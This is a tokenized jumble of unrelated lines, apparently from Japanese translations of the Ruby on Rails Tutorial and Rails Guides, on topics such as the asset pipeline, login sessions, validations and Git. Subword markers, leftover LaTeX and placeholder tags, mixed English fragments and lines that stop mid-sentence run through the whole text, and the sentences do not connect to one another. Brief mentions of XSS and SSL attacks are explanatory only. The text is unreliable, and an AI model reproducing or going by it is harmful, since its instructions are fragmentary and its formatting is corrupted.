▁Rails アプリケーション を新規作成する 際に アセットパイプライン をオフに したい場合は 、 以下のように ` - - skip - sprockets ` オプションを 渡します 。
▁ Array ▖ wrap ( foo : ▁: bar ) ▁# ▁=> ▁[ { : foo => : bar } ]
▁ Markdown d で フォーマット された 改良 版 \ k ode { README } ファイル
▁リスト \ ref { code : email _ downcase } の メールアドレス 小文字 変換 をテストする
▁これにより rails ▖ js に含まれる CoffeeScript が DOM の 属性を リ ッ ス ン する ようになり 、 それらの 属性 に 適切な ハンドラ が与えられ ます 。
▁\ k ode { destroy } は \ k ode { create } の 逆 です 。
▁ 後 は 、 いつものように フィード パーシャル を 表示 すれば Home ページに フィード を追加 できます ▁( リスト \ ref { code : home _ with _ feed }) 。
▁ 先に サンプルデータを 自動 作成 しておけば 、 Web ページの 見た 目 の デザイン から 先に と り か か る ことができ 、 バックエンド の 機能 の実装 を この節 の 後に 回 す ことができます 。
▁The ▁error ▁occur r ed ▁while ▁evaluat ing ▁nil ▖ empty ?
▁特定の属性にアクセスするための 、 種類 が " url " の input タグを返します 。
▁Rails で の開発 経験 者 であれば 、 この時点で \ k ode { content _ for } の使用 を 検 討 する と思います が 、 残念ながら Asset ▁Pipeline と併用する と 正常に動作し ない ことがあります 。
▁$ ▁ cd ▁~/ rails _ projects / sample _ app
▁` config ▖ action _ mailer ▖ perform _ deliveries ` ▁specifie s ▁whether ▁mail ▁will ▁actually ▁be ▁ deliver ed ▁and ▁is ▁true ▁by ▁default ▁( 訳 : ▁` config ▖ action _ mailer ▖ perform _ deliveries ` は 、 メールを 実際に 配信 する かどうかを指定します ▟ デフォルト値 は true です ▟)
▁\ ref { sec : the _ form _ html } で 説明したように 、 この HTML は \ text tt { POST } リクエストを / users という URL に 送信 します 。
▁ テスト駆動開発 で 最初に 書く 、\ emph { 失敗する } テストの ことを 、 一般的な テスト ツール では 「 赤色 ▁( R ed )」 と 表現 します ▁( 失敗 時に 表示 が 赤 くなる ツール が多い ため ) 。
▁` has _ and _ belongs _ to _ many ` 関連付けを 宣言 した クラス では 、 以下の 16 の メソッドを 自動的に 利用 できるようになります 。
▁ サンプルアプリケーションの \ k ode { Gemfile } に Guard を追加する 。
▁ユーザー登録 に アカウント有効化 を追加する
▁ や っ と マイクロポスト 一覧 のコード そのもの に た ど り 着 きました 。
▁以下の コマンドで 1 つ 前 の状態 に 戻 す こともできます 。
▁この フォームの 送信 先 は ` update ` アクション になります ▟ 今 の 時点 では 未 定義 ですが 、 この後 すぐ 定義 します 。
▁この ` includes ` クエリ の場合 、 どの 記事 にも コメント が つ い ていない ので 、 すべての 記事 が 読み込まれます 。
▁ これらは いずれも よく でき ています が 、 中に は Ruby のバージョン が 1 ▖ 6 など 古 い もの もあります のでご注意ください ▟ また 、 バージョン 1 ▖ 8 を 対象 に している もの が 多く 、 Rails での 日 常 的な 開発 に 使用されている 新しい 文法 が 含まれていない こともあります 。
▁"/ Users / ry an / Site s / side _ projects / blorgh / app / views "
▁Active ▁Support
▁` assets : precompile ` を 代りに 使用 してください 。
▁ 章 の 最後に 、 ユーザーを サイトに ログイン させるため の 重要な 一 歩 を 踏 み 出 します ▁(\ ref { sec : user _ signup }) 。
▁上の フォーム が 送信される 時に 作成される params オブジェクト は以下のようになります 。
▁この メッセージ を ブラウザで 表示する には 、 ユーザーの \ k ode { new } ページ で エラーメッセージ の パーシャル ▁( partial ) ▁ を出力します ▟ このとき 、\ k ode { form - control } という CSS クラス も一緒に 追加 することで 、 Bootstrap が うまく 取り 扱 っ てくれる ようになります ▟ 変更 の 結果を リスト \ ref { code : f _ error _ messages } に示します 。
▁### ▁HTTP ▁PATCH
▁@ customer ▖ orders ▁<< ▁@ order 1
▁# ▁< rank ▁type =" integer "> 1 </ rank >
▁` Range # overlap s ?` メソッドは 、 与えられた 2 つの 範囲 に ( 空白 でない ) 重 なり があるかどうかをチェック します 。
▁Rails アプリ と 通 信 する 際 、 ブラウザは 一般的 に Web サーバー に \ emph { request } ▁( リクエスト ) ▁ を送信し 、 これは リクエストを 処理 する 役 割 を 担 っている Rails の \ emph { controller } ▁( コントローラ ) ▁ に渡され ます 。
▁次に \ k ode { bundle ▁install } を実行します 。
▁\ ref { sec : sass } で 触れ た ように 、 まずは リスト \ ref { code : footer _ css } の フッター 用 CSS を リスト \ ref { code : refactored _ scss } の SCSS に変更し てみてください 。
▁\ k ode { admin } 属性 の 変更 が 禁 止 されている こと をテストする
▁config ▖ assets ▖ js _ compressor ▁= ▁: uglifier
▁\ k ode { index } アクション には ログインを要求 する
▁\ k ode { Gemfile } に Faker を追加する
▁ これはリスト \ ref { code : edit _ update _ redirect _ tests } で使用されていました 。
▁ 大 規 模 な Web サイト では 、 バ ッ ク グ ラ ウ ンド ジョブ を使用して 、 フィード を 非同期 で 生成する などの 対策 が必要 でしょう ▟ Web サイトの ス ケ ー リ ング のような デ リ ケ ート な 問題 は 本書 の 範 疇 を 超 えます ) 。
▁リスト \ ref { code : signup _ button } で ▁\ k ode { image \_ tag } ヘルパー を使っている ので 、 Rails は 該当する 画像ファイル を 、 アセットパイプライン を通して \ k ode { app / assets / images / } ディレクトリ の中から 探 してくれます ▁( アセットパイプライン については \ ref { sec : sass _ and _ the _ asset _ pipeline } で説明します ) 。
▁[ Sign ▁out ] ▁ リンク の表示
▁もちろん 、 必要であれば もっと 詳 しく 書 い てください 。
▁これらの コードは 等 価 では あります が 、\ k ode { assert \_ no \_ difference } を使う 方が 明 瞭 で 、 Ruby の慣習 的に も 正しい です 。
▁Rails の Asset ▁Pipeline は 、\ k ode { ▖ scss } という 拡張子 を持つ ファイルを Sass を使って 自動的に 処理 してくれます ▟ このため 、\ k ode { custom ▖ css ▖ scss } ファイルは Sass プリプロセッサ によって 前 処理 され 、 その後 ブラウザ への 配信 に 備えて パッケージ 化 されます 。
▁このコードは リスト \ ref { code : user _ info } で使用されていました ▟ もうひとつ 、
▁ 残 念 な ことに 、 この 名前 付け は 逆 については うまく い き ません ▁( Rails の という より 英語 の 都 合 ですが )▟ フォロー されている すべての ユーザーの 集合 は 、 このままでは \ emph { followed s } と なってしまい 、 英語 の 文法 から も 外 れる う え に 非常に 見 苦 しい もの になってしまいます 。
▁ メソッドで 引数 の 変数 名 に どんな 名前 を使って も 、 メソッドの 呼び出し 側 には 何 の 影 響 も 生 じ ない という 点 にも ご 注 目 ください 。
▁( ローカル 環境で Rails アプリケーションを 開発 している ときは 、 クライアント と サーバー が 同じ コンピュータ 上で 動 い ています が 、 一般的 には 、 それぞれ 別の コンピュータ で 動作 している という 点を 理解 しておいてください ) 。
▁ここでは 、\ k ode { ’ shared / error \_ messages ’} という パーシャル を \ k ode { render } ▁( レンダリング ) ▁ し ている点に注目してください ▟ これは Rails 全 般 の慣習 で 、 パーシャル は 複数の コントローラに わ た る ビュー に対し 、 専 用の \ k ode { shared / } ディレクトリ を使用する ようにしています
▁ 実際 、 筆者 は Ruby ▁on ▁Rails ▁ の チュートリアル を 書き ながら 、 あまり にも \ href { http :// en ▖ w ikipedia ▖ org / wiki / D ar k _ side _ ( S t ar _ W ar s )} { お 手 軽 に コードを 生成 できる } ▁( 訳 注 : ▁ 原 文 の 「 q u ic k er , ▁easier , ▁more ▁ s ed u c tive 」 は 、 ス ター ウ ォ ー ズ ・ エ ピ ソ ー ド V の ヨ ー ダ の 台 詞 の 引 用 ) ▁scaffold の 機能 を使う 誘惑 に から れる ことが 何 度 も あり ました 。
▁\ ref { sec : reset ting _ the _ password } の リスト \ ref { code : password _ reset _ form } で 見た ように 、 隠 し フィールド の \ k ode { input } タグ を使う ことで 、 ブラウザ 上に 表示 さ せずに 適切な 情報 を含め ることができます 。
▁ セッション に含まれる 現在のユーザー を検索する
▁ 通常 、 Rails ヘルパー を使用している場合 、 実装 の詳細 について 知 っ ておく 必要はありません ▟ ただし \ emph { f } という オブジェクトが \ k ode { 何 を する のか は 知 っ ておく } 必要があります ▟ この \ emph { f } オブジェクトは 、\ href { http :// www ▖ w 3 school s ▖ com / html / html _ form s ▖ as p } { HTML フォーム 要素 } ▁( テキストフィールド 、 ラ ジ オ ボタン 、 パスワード フィールド など ) ▁ に対応する メソッドが 呼び出される と 、\ emph {@ user } の 属性 を設定する ために 特 別 に 設計 された HTML を返します 。
▁また 、 各 リンクを \ text tt { if } 文 で 囲 い 、 { 1 / } 管理者 に だけ 削除リンク が表示される ようにしています 。
▁ そして 、 Article モデル ` app / models / article ▖ rb ` を 編集 して 、 他 方のモデル を追加する 必要があります 。
▁この 手法 には 、`: origin al _ process ` が 取得 される 可能性 がある という リスク があります 。
▁\ ref { sec : objects _ and _ message _ passing } では 文字列 に対して \ k ode { empty ?} メソッド を使用しました が 、 Rails の エラー オブジェクトに対して も使用できます ▟ オブジェクトが 空の 場合は \ k ode { true } 、 ▁ それ以外の 場合は ▁\ k ode { false } を返します 。
▁ コントローラの 内 側 で 定義された メソッドは 、 コントローラのアクション になります 。
▁ 今回の デモアプリケーション では 、 ユーザー と 短い マイクロポスト のみ を サポート する マ イ ク ロ ブログ を作成します 。
▁* ▁ アセットパイプライン のメリット
▁ そして 、 issue の 扱 い について 過 度 な 期 待 を 抱 か ないこと も 肝 心 です 。
▁options ▁= ▁ { length : ▁30 , ▁omission : ▁" ▖▖▖" } ▖ merge ( options )
▁まずは 、 第 \ ref { cha : static _ pages } 章 の演習 で 取り上げ た Contact ページ について 追加 しましょう 。
▁### ▁ ジョブ を作成する
▁ 最後の 機能 として 、 マイクロポスト リソース に ポスト を削除する 機能 を追加します 。
▁ アセット へのリンク で使用される プロトコル ス キー ム は 、 Web ページ ヘ の リクエスト 発生 時に 、 その ページ への デフォルトの アクセス 方法 に合わせて 適切に 生成されます 。
▁上のコード を使用する 際 は 、` require _ tree ` ディレクティブ を使用して いない ことを 必ず 確認してください ▟ ` require _ tree ` と併用する と 、 アセット が 2 回 以上 インクルード されてしまいます 。
▁ ter abytes
▁ テキストエディタ か IDE を使用して \ k ode { app / models / micropost ▖ rb } を開き 、 ▁{1} {2} リスト 2▖1 0 {/2}{/1} の内容 に置き換え ます 。
▁たとえば 、` Book ▖ find (: all , ▁conditions : ▁ { ▁name : ▁' 19 8 4 ' ▁ }) ` は 非推奨 です ▟ 今後 は ` Book ▖ where ( name : ▁' 19 8 4 ') ` を ご 使用 ください 。
▁Rails には 、 JavaScript を さらに 使い や す く した CoffeeScript が デフォルトで 組み 込 まれ ています ▟ 以後 、 本ガイド では すべての 例を CoffeeScript で 記 述 します 。
▁ 当 然 ながら 、 既 知 の バグ が 未 修正 の状態 であれば 、 このテストは パス する べ き ではありません ▟ この問題 を キャッチ する 、 失敗する テスト を追加しましょう 。
▁ 特定の 属性 用の input フィールド に与える ラベル を返します 。
▁つまり 、1 人のユーザー は 1 対 多 の関係 を持つ ことができ 、 さらに ユーザーは リレーションシップ \ k ode { を経由して } 多くの \ emph { following } ▁( または \ emph { followers }) ▁ と 関係 を持つ ことができる ということです 。
▁最初に 、 フォーム が 送信された ときの 動作を 順 を 追 って 理解 します ▟ 次に 、 ログイン が 失敗した場合 に表示される エラーメッセージ を 配置 します ▁( モックアップ を 図 \ ref { fig : login _ failure _ mockup } に示します ) 。
▁ ログ出力 を 無効 に するには ` nil ` を設定します 。
▁ 実は 、 ハッシュ が 関数 呼び出し の \ emph { 最後の } 引数 である 場合は 、 波 括 弧 を省略 できます ▟ 以下の 2 つの 行 は 同等です 。
▁# ▁require ▁" sprockets / ra i lt i e "
▁SSL 攻 撃 を 緩和 するために 、` form _ authenticity _ token ` が マ ス ク される ようになりました ▟ これにより 、 この トークン は リクエスト ごとに 変更 されます 。
▁return ▁false
▁この 作業 は ユーザーの edit ビューで ユーザー を更新する ▁( リスト \ ref { code : user _ edit _ view }) ▁ の と似ています が 、 今回は パスワード 入力 フィールド と 確 認 用 フィールド だけ を使います 。
▁self
▁ シンボル とは ラベル である ▟ 追加 的な 構造 を 持 た ない ▁( 代入 など が できない ) ▁ 文字列 み たい な もの 。
▁この 「 参 照 が コピー される 」 動作 は 、 Ruby の オブジェクトの 複 製 を行う ときに 多 大 な 注意 を 払 わ ない と いけない ことを意味します 。
▁domain : ▁' example ▖ com ',
▁Time ▖ local (200 0, ▁ 11 , ▁31)▖ next _ quarter ▁# ▁=> ▁We d , ▁28 ▁Feb ▁200 1
▁``` ruby
▁ さ て 、 次の 埋め込み Ruby では
▁validates _ associated ▁: books
▁ } ╼╼% ▁subsection ▁setting _ the _ root _ route ▁( end )╼╼ ▁% ▁section ▁slightly _ dynamic _ pages ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : static _ pages _ co nclusion }╼╼ S e en ▁from ▁the ▁out side , ▁this ▁chapter ▁hard ly ▁accomplish ed ▁anything : ▁we ▁started ▁with ▁static ▁pages , ▁and ▁end ed ▁with \ l do t s \ ▁\ emph { mostly } ▁static ▁pages ▖
▁上 記 に対応する ビュー は 以下 です 。
▁= ================ ================
▁ o ▁= ▁c ▖ orders ▖ first
▁2 つ目の バリデーション では 、 画像 の サイズ を 制御 します ▟ これは Micropost モデルに 書き 足 していきます 。
▁### ▁ Turbolinks の動作 原 理
▁Rails のインストール
▁ ビューテンプレート で 使用できる 言語 は 、 デフォルトでは e Ruby ▁( ERB とも 、 Embedded ▁Ruby とも 呼 ば れ ます ) ▁ が使用されます ▁( 訳 注 : ▁ 近 年 は ha m l テンプレート が よく使われます )▟ ERB で 書かれた コードは 、 ユーザー に表示される 前の リクエスト サイクル で Rails によって 処理 されます 。
▁\ href { https :// www ▖ code school ▖ com /}{ Code ▁School } : ▁ プログラミング を対話的に 学習 できる コース
▁たとえば 、 パーシャル 内で `@ products ` を レンダリング した 回 数を ` product _ counter ` 変数 で 参 照 できます 。
▁$ ▁rails ▁server ▁-- environment ▁production
▁c attr _ accessor ▁: last _ name , ▁instance _ writer : ▁false
▁これで ひ と 安 心 です 。
▁ これはリスト \ ref { code : user _ signin _ test _ valid _ information } で使用されていました 。
▁図 \ ref { fig : profile _ mockup _ profile _ name } のモックアップ に 近 づ け るために 、 ユーザーの サイドバー の最初の バージョン を 作り ましょう 。
▁XSS 攻 撃 に 利用 され やすい 言語 は 、 言 う まで も なく クライアント側 で 最も 普 及 している 言語 である JavaScript であり 、 し ば し ば HTML と 組み合わせ て 攻 撃 に 使用されます ▟ ▁ _ 攻 撃 を 避ける には ユーザー 入力 を エスケープ する _ ▁ 必要があります 。
▁ _ 近 年 における Web アプリケーション への 攻 撃 を理解する ために 、 実際の 攻 撃 例 をご紹介します 。
▁ 空の コレクション はデフォルトで は ゼロ を返します が 、 この動作 は カスタマイズ 可能です 。
▁ パスワード 再設定 用 フォーム のモックアップ
▁=> ▁[ 42, ▁ 8, ▁17 , ▁7 , ▁" foo ", ▁" bar "]
▁### ▁` ordinal `
▁たとえば 、 注文 ▁( order ) ▁ の作成 日 の コレクション を検索し たい場合は 、 以下のように します 。
▁今度は 、 新しい レコード を作成するとき に ' locked ' 属性を ` false ` に設定し たい が 、 それを クエリ に含め たくない とします 。
▁class ▁A d ▁< ▁ActiveRecord :: Base
▁デフォルトは ` 3 ` です 。
▁ 仕 上 げ に 、 ユーザー 設定 のリンク に URL を 1 つ 追加 して サイト 内 を 移動 できるようにします 。
▁ 関連付けの 両 側 で この ヘルパー を使用すると 無 限 ループ になります 。
▁ デフォルトの フォーマット は `: html ` なので 、 Rails は HTML テンプレート を探し ます 。
▁Gemfile に記述 した \ text tt { rspec - rails } が 依存関係 を 解決 してくれる ため 、 ▁ 個 々 の 環境 に RSpec 自身 を 手動で インストール する必要が なく なり 、 自動的に インストール される ようになります 。
▁この 振る舞い は 、\ k ode { has \_ many } メソッドに オプション を渡して あ げ ること で 実装 できます ▁( リスト \ ref { code : micropost _ dependency }) 。
▁SQL で 検索 する
▁ 述 語 や フラグ での 論理値 の 表 記 は 、 正 確 な 値 表現 よりも 、 論理値 の 意味 を 優 先 すること 。
▁initializer ▁" blorgh ▖ assets ▖ precompile " ▁do ▁| app |
▁ コンソール は イン タ ラ ク ティブ Ruby ▁(\ k ode { i rb }) ▁ 上に 構 築 されている ため 、 Ruby の 機能 をすべて 使う ことができます
▁# ▁gem ▁' unicorn '
▁create ▁mode ▁100 64 4 ▁Rake file
▁# ▁=> ▁ 重複 の ない 一意 の名前 が 返される
▁invoke ▁active _ record
▁HTML 構造 を削除し た Home ページ ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁その 一 方 、「 バグ 」 と 「 機能 」 の 線 引 き は そう 簡 単 ではない こともあります 。
▁ 多少 苦 労 しても 構 わ ないので ローカル P C 環境で \ emph { Ruby ▁on ▁Rails チュートリアル } を 学習 したい と お 考え の方 には 、\ href { http :// install rails ▖ com /}{ InstallRails ▖ com } { p 2 } に従って 環境 を 構 築 する ことをお勧めします ▟ [ N I W A T A K O _ T IP S ]
▁このコードは リスト \ ref { code : title _ tests } で使用されていました ▟ もうひとつ 、
▁### ▁ _ アセット _ ▁ の パス を変更する
▁この 目的 を 達 成 する ため 、\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } では 、 統合 的な アプローチ を採用し ています ▟ つまり 、「 実際に 動く サンプルアプリケーション を ゼロ から 開発 する 」 という 例 題 を こ な す ことによって 、 Rails について 総 合 的に 学ぶ のです 。
▁ユーザー登録 が 行われた ときに 、 有効化トークン と 、 それに対応する 有効化 ダイジェスト を生成する 。
▁これは 、\ k ode { edit } アクション への 名前付きルート が必要になる ということです 。
▁ 言い 換 え ると 、\ k ode { object : ▁f ▖ object } は \ k ode { error \_ messages } パーシャル の中で \ k ode { object } という 変数 名 を作成し てくれる ので 、 この 変数 を使って エラーメッセージ を 更新 すれば よい ということです ▁( リスト \ ref { code : updated _ error _ messages _ partial }) 。
▁ セッション の \ k ode { new } アクションと ビュー をテストする 。
▁ ログイン に使用する メソッドは 、 テスト の種類 によって 異なります ▟ 統合テスト の 内部で は 、 リスト \ ref { code : user _ login _ test _ valid _ information } のように セッション パス を post します が 、 コントローラ や モデル などの 単 体 テストでは 同じ 方法 が 使 え ません ▁( セッション がない からです )▟ 後者の 場合は \ k ode { session } メソッドを 人 為 的に 操作 して 回 避 し なければなりません 。
▁* ▁ アセットパイプライン
▁> > ▁JSON ▖ generate ( FooBar ▖ new , ▁ q u ir k s _ m ode : ▁true ) ▁# ▁=> ▁" \ " # < FooBar : 0 x 0 07 fa 80 a 48 16 10 > \ " "
▁ コメントアウト して いた 箇所 を 元に戻す と 、 テストが {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するよう になるはずです 。
▁ 修正 後 フォーム を再 送信する と 、 今度は また しても 「 a ▁template ▁is ▁missing 」 エラーが表示され ます 。
▁` render ` による 描画 は 、 フォームの 送信 時 と同じ リクエスト 内で 行われます ▟ 対 照 的に 、` redirect _ to ` は サーバー に 別 途 リクエストを 発行する よう ブラウザ に対して 指示 する ので 、 やりとり が 1 往 復 増え ます 。
▁Rails アプリケーション のバージョン が 3▖1 より 前 の場合 、 まず 3▖1 へのアップグレード を 完了 してから Rails ▁3▖2 へのアップグレード に と り か か ってください 。
▁ 編集 用の ビュー に含まれる フォーム は 、 記事 を作成するとき の ビュー に含まれる フォーム と 基本的に ほとんど 同じです 。
▁# ▁ Requir e ▁the ▁gems ▁list ed ▁in ▁Gemfile , ▁including ▁any ▁gems
▁これらの メッセージ は モデルの 検証 時に 生成される ので 、 メールアドレス の スタイル や パスワード の 最 小 文字列 など を変更する と 、 メッセージ も 自動的に 変更 されます ▟ [ B R ] ╼[ B R ] ╼ ( このとき 、 存在性 のバリデーション も has _ secure _ password による バリデーション も 空の パスワードを 検 知 してしまう ため 、 ユーザー登録フォーム で 空の パスワード を入力する と 2 つの 同じ エラーメッセージ が表示され てしまいます ▟ もちろん こういった 冗 長 な エラーメッセージ を直接 修正 すること も 可能です が 、 幸 運 にも 今回の 場合は 、 後 ほど 追加する ▁allow _ nil : ▁true ▁という オプションで この問題 は 解決 できます ▟)
▁ 実際に や って みましょう 。
▁ 画像 に対する バリデーション を追加する
▁` advance ` メソッドは 最初に 月 を 進 め 、 それ から 日 を 進 め ます ▟ それ により 以下の 結果を 得 ます 。
▁ リファクタリング
▁* ▁`: rel ` は リンク 内の ` rel ` 値 を指定します 。
▁ conflict ▁config / routes ▖ rb
▁リスト \ ref { code : gravatar _ option } のコード を使用して 、 { p 2 } で 定義された {3} gravatar _ for {/3} ヘルパー に オプション の {3} size {/3} パラメータ ー を 取ること が できる ▁( {3} gravatar _ for ▁user , ▁size : ▁40 {/3} のような コードを ビューで 使用できる ) ▁ ことを確認してください 。
▁$ ▁ rack up ▁config ▖ ru
▁そこで \ href { https :// github ▖ com / co d a ha le / bcrypt - ruby / blo b / master / lib / bcrypt / password ▖ rb } { bcrypt ▁gem の ソースコード } を 詳 しく 調 べ てみると 、 な ん と 、 比 較 に 使用している \ k ode {==} 演算子 が \ emph { 再 定義 } されています ▟ 実際の 比 較 を コード で 表 す と 、 以下の ようになっています 。
▁この すべて を実装 した結果 を 、 リスト \ ref { code : relationships _ controller _ following } に示します 。
▁ 結果 として 、\ ref { sec : unicorn _ in _ production } で アプリケーションの デプロイ が 終 わ ると 、 自動的に SSL が 有効化 されている はずです ▟ , ▁SSL ▁will ▁automatically ▁be ▁enabled ▖
▁resources ▁: comments , ▁ shallow : ▁true
▁### ▁ ハッシュ キー が シンボル でも 文字列 で も同様に 扱 う ▁( indifferent ▁access )
▁` pluck ` は 、1 つの モデル で使用されている テーブル から カラム ▁( 1 つ でも 複 数 でも 可 ) ▁ を取得する クエリ を 送信 するのに 使用できます 。
▁ バリデーション メソッド を実装する には 、 定義 済み の ` record ` パラメータ を持つ 必要があります ▟ この パラメータ は バリデーション を行なう レコード です 。
▁| ▁DELETE ▁| ▁ / geocoder ▁| ▁ geocoder s # destroy ▁| ▁ geocoder リソース を削除する ▁|
▁次に 、 図 \ ref { fig : failed _ signin _ flash _ 3 r d _ edition } と 図 \ ref { fig : flash _ persistence _ 3 r d _ edition } の 手順を テストコード で 再 現 する必要があります 。
▁Article ▖ any ?
▁create ▁app / views / blorgh / articles / index ▖ html ▖ erb
▁m attr _ accessor ▁: autoload ed _ constant s
▁この 式 を指定する には 、 単 に lock オプション の 引数に します 。
▁{0} Figure ▁1▖ 11 : ▁{/0}{1} A ▁schematic ▁representation ▁of ▁the ▁model - view - controller ▁( MVC ) ▁architecture ▖ {/1}
▁assemblies ▖ empty ?
▁REST ▁API
▁{0} 表 6 ▖ 1 {/0} ▁{1} メールの 正規表現 を 分 解 した結果 {/1}
▁end
▁ 名前 の 衝 突 の 例として 、 ヘルパー を 取り上げ ましょう 。
▁最初に 、\ k ode { div } タグ の CSS ▁class ▁ が ▁“ pagination ” になっている こと をテストします ▟ これは \ text tt { will _ paginate } によって 出力 されます 。
▁次に 、 以下の RSpec リクエスト spec ▁( 結合テスト ) ▁ を見てみましょう 。
▁@ target ▖ blank ?
▁` where ` オプションで ハッシュ を使用した 場合 、 この 関連付け で 作成された レコード は自動的に この ハッシュ を使用した スコープ に含まれる ようになります 。
▁ 読み 取り 専 用 オブジェクト
▁上のコードでは 、\ k ode { users } テーブルの \ k ode { email } カラム に インデックス を追加する ために \ k ode { add \_ index } という Rails の メソッド を使っています 。
▁ エラーメッセージ が正しく 表示 されている かどうか については 、 演習 として 残しておきます ▁(\ ref { sec : exercises _ a _ test _ for _ invalid _ submission }) 。
▁` render ` で `: html ` オプションを使用すると 、 HTML 文字列 を直接 ブラウザに送信 することができます 。
▁#### ▁` class _ attribute `
▁\ emph { 注意 } : ▁ これまで は \ k ode { rake ▁test } を 実行 した結果 の一部 ▁( 成功 結果 や 失敗 結果 など ) ▁ も 載 せ ていました が 、 紙 幅 の関係 から 、 今後 は 実行 結果を 省略 します 。
▁このとき 、` Comment ` モデル を生成する こと 、 integer 型の ` article _ id ` カラム と text 型の ` text ` カラム を持つ テーブル と 関連付け ること を 指示 します 。
▁Article モデル ` app / models / article ▖ rb ` を以下のように変更し ましょう 。
▁#### ▁field _ set _ tag
▁[ \ href { http ://0▖0▖0▖0:3000/ users ? page = 2 } {2} ] ▁ リンク または ▁[ \ href { http ://0▖0▖0▖0:3000/ users ? page = 2 } { N ext } ] ▁ リンクをクリックすると 、 図 \ ref { fig : user _ index _ page _ two _ rails _3} のように 次の ページ に移動し ます 。
▁\ k ode { text } フィールド と \ k ode { password } フィールド に 文字 を 入力 した 状態
▁* ▁` attachments ` ▁- ▁ メール に ファイルを 添付 します 。
▁if ▁@ book ▖ update ( book _ params )
▁なお 、 20 11 年 には 、 Rails ▁ コ ミ ュ ニ テ ィ への 高い 貢献 が 認 め ら れ て 、\ href { http :// ruby her o es ▖ com / her o es } { Ruby ▁H er o ▁A ward } ▁ を 受 賞 しました 。
▁ 前 書き
▁ いよいよ Relationship の関連付け の 核 心 、\ k ode { following } と \ k ode { followers } に取りかかりま す 。
▁ 同様に 、 有効な データを 送信する 操作を シ ミ ュ レ ート するには 、 ▁\ k ode { fi ll _ in } を使用して 正しい ユーザー情報 を与え ます 。
▁( エラーメッセージ の詳細については \ ref { sec : signup _ error _ messages } で説明します ) 。
▁id = \ k ode {1} のユーザー を表示する ページ
▁\ k ode { header } タグ の内側に は 2 つの \ k ode { div } タグ があります 。
▁> > ▁x ▁= ▁1
▁ 単純な 変更 であれば これで 十分 バックポート できます 。
▁HTTP の ヘッダー ブロック の 後ろに は 2 つの CRLF が 置かれ て ヘッダー ブロック の 終 了 を 示 し 、 その 後ろに 実際の データ ( 通常 は HTML ) が置かれます 。
▁ 関連付けられた オブジェクトが保存される ことも ありません 。
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 {1} {2} 第 8 章 {/2}{/1} で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁もちろん 、 このような 重複 ▁( 2 回 以上 フォロー すること ) ▁ が 起 き ない よう 、 インターフェイス 側 の実装 でも 注意 を 払 います ( \ ref { sec : following })▟ しかし 、 ユーザーが 何らかの 方法で ▁( たとえば \ k ode { curl } などの コマンドライン ツール を使用して ) ▁Relationship の データを 操作 する ような ことも 起こ り 得 ます ▟ そのような 場合 でも 、 一意 な インデックス を追加し ていれば 、 エラーを 発生 させ て 重複 を防ぐ ことができます 。
▁( なお 、\ k ode { underscore } と 逆 の 働 き を する \ k ode { camelize } という メソッド もあります ▟ これは \ k ode {" c a me l _ case "} を \ k ode {" CamelCase "} のように 変換 します ) ▁ 。
▁ _ ▁たとえば 、 ユーザーを 特定の ページ へ リダイレクト して 戻 したい とします 。
▁Client ▖ where (' locked ' ▁=> ▁true )
▁### ▁ カスタム バリデータ
▁置き換えた結果を \ ref { code : microposts _ create _ action } に示します 。
▁( Not ▁ Y e t ▁Implement ed )
▁上のコード を実行する だけで 、( \ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 4/ classes / ActiveModel / Validations / Helper Methods ▖ html # method - i - validates _ confirmation _ of } { Rails ▁API } に記載されている ように ) ▁\ k ode { password _ confirmation } という 属性 が 作成されます 。
▁JRuby 環境で SQLite 3 を採用する 場合 、` config / database ▖ yml ` の 記 述 方法は 少し 異なります 。
▁(\ emph { 注 : } この時点では わざわざ 見 に 行 く ほど の 仕 上 が り ではありません が ) 。
▁#### ▁` from ( position ) `
▁その 理由 については {0}{1} 第 6 章 {/1}{/0} で説明します ) 。
▁本ガイドでは 、 Ruby ▁on ▁Rails の開発 に 「 あなた 」 が 参 加 する方法 について説明します 。
▁# ▁first ▁created ▁-> ▁high est ▁ priority ▖
▁ ブラウザで ページ を再読み込みする と 、 フラッシュメッセージ が表示され な くなる
▁リスト \ ref { code : remember _ method } のコード では 、 ログイン する ユーザーは ブラウザで 有効な 記憶トークン を 得 られる ように 記 憶 されます が 、 リスト { p 2 } で定義した {3} current _ user {/3} メソッドでは 一時 セッション しか 扱 って い ないので 、 このままでは 正常に どう さ しま s
▁ ブラウザ を 完全に 終 了 すると 、 期待どおり アプリケーションの ログイン ステータス が 消 去 され 、 再び ログインを要求 される ようになった ことを確認 できます 。
▁ 以下のように もっと 簡潔 な 方法で 記 述 することもできます 。
▁たとえば \ ref { sec : remember _ me } では 、 ログイン と ログアウト 用の ヘルパーメソッド を サンプルアプリケーションの すべての コントローラで 利用できる ようにしています 。
▁デフォルトは `: css ` です 。
▁config ▖ action _ dispatch ▖ default _ headers ▁= ▁ {
▁デフォルトでは 、 Rails の アセット は プリコンパイル 済み かつ 静 的な アセット として Web サーバー から 提供され ること が 前 提 になっています 。
▁Git の場合 、 コミット を実行して も リモート 上 にある リポジトリ を直接 変更 する ことはありません ▟ Git では 、 ローカル での 変更 保存 ▁(\ k ode { git ▁commit }) ▁ と 、 リモート 上の リポジトリ への 変更 反 映 ▁(\ k ode { git ▁push }) ▁ の 2 段 階 に 分 か れ ています 。
▁* ▁` ActiveRecord :: Schema D um p er ▖ i gnore _ table s ` は テーブル名 の配列 を 1 つ 引数に 取り ます ▟ どの スキーマ ファイルに も ▁ _ 含 め たくない _ ▁ テーブル名 がある場合 はこの 配列 に テーブル名 を含め ます 。
▁=> ▁" aaaaaaaaaaaaaaaa a aaaaaaaaaaaaaaaa a aaaaaaaaaaaaaaaa a "
▁ Michael ▁Hartl ▁( マ イ ケ ル ハ ート ル )
▁* ▁` find _ or _ create _ by _▖▖▖` ▁ に代えて ` find _ or _ create _ by (▖▖▖) ` を使用
▁* ▁Rails セキュリティ ▁[ メ ー リ ング リスト ]( http :// groups ▖ google ▖ com / group / rubyonrails - security ) を 購 読 しましょう 。
